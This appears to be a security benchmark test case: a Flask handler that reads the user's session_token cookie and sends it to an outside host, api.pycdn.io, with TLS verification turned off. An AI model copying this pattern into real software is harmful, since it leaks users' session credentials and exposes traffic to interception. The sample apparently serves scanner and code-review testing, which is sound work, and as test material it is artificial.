# SPDX-License-Identifier: Apache-2.0
from dataclasses import dataclass
from flask import request, jsonify
import requests


@dataclass
class FormData:
    payload: str

def BenchmarkTest56316():
    cookie_value = request.cookies.get('session_token', '')
    data = FormData(payload=cookie_value).payload
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return jsonify({"result": "success"})
